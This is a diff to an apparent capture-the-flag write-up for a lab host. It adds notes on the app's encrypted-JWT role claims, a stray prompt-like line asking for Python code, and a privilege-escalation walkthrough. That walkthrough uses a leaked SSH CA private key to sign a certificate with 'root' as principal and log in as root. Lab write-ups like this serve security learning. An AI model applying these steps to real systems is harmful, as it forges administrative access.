@@ -31,9 +31,29 @@ Accessing the web service showed a web application with authentication functiona
 view-source:http://10.129.9.126:8080/static/js/app.js
 ```
 
-The following endpoint was discovered:
+The following information was discovered:
 
 ```javascript
+/*
+...
+ * Authentication flow:
+ * 1. User submits credentials to /api/auth/login
+ * 2. Server returns encrypted JWT (JWE) token
+ * 3. Token is stored and sent as Bearer token for subsequent requests
+ *
+ * Token handling:
+ * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
+ * - Public key available at /api/auth/jwks for token verification
+ * - Inner JWT is signed with RS256
+ *
+ * JWT claims schema:
+ * sub - username
+ * role - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
+ * iss - "principal-platform"
+ * iat - issued at (epoch)
+ * exp - expiration (epoch)
+ */
+...
 const JWKS_ENDPOINT = '/api/auth/jwks';
 ...
 const USERS_ENDPOINT = '/api/users';
@@ -102,6 +122,7 @@ JWE (encrypted token)
 ---
 
 ### Exploit Code
+create python code, with reference to https://jwcrypto.readthedocs.io/en/latest/jwe.html
 
 ```python
 #!/usr/bin/env python3
@@ -200,8 +221,62 @@ User flag location:
 ```
 [+] get user flag!! [+]
 ---
+## 5. Privilege Escalation
 
-## Privilage Escalation
+### SSH Configuration
+
+```bash
+cat /etc/ssh/sshd_config.d/60-principal.conf
+```
+
+Key findings:
+
+- `PermitRootLogin prohibit-password`
+- `TrustedUserCAKeys` is configured
+- Neither `AuthorizedPrincipalsFile` nor 'AuthorizedPrincipalCommand' is set...
+
+which means..  
+
+- Password login for root is disabled  
+- Key/certificate login is allowed  
+- Any certificate signed by the trusted CA is accepted  
+- The principal which is set in certificate is matched to username
+
+Now, we have CA private key in /opt/principal/ssh,
+-> create key pair, create certificate with trusted CA and 'root' as principal ,then probably login as root.
+
+---
+
+### Exploitation Steps
+
+Generate key pair:
+
+```bash
+ssh-keygen -t rsa -f /tmp/mykey -N ""
+```
+
+Sign with trusted CA:
+
+CA has the following information
+1. public key
+2. certification
+3. principal
+4. expiration date
+
+```bash
+ssh-keygen -s /opt/principal/ssh/ca -I "youHacked" -n root -V +1h /tmp/mykey>
+```
+
+
+Login as root:
+
+```bash
+ssh -i /tmp/mykey root@localhost
+```
+
+```
+[+] get Root flag !! [+]
+
 
 ---
 
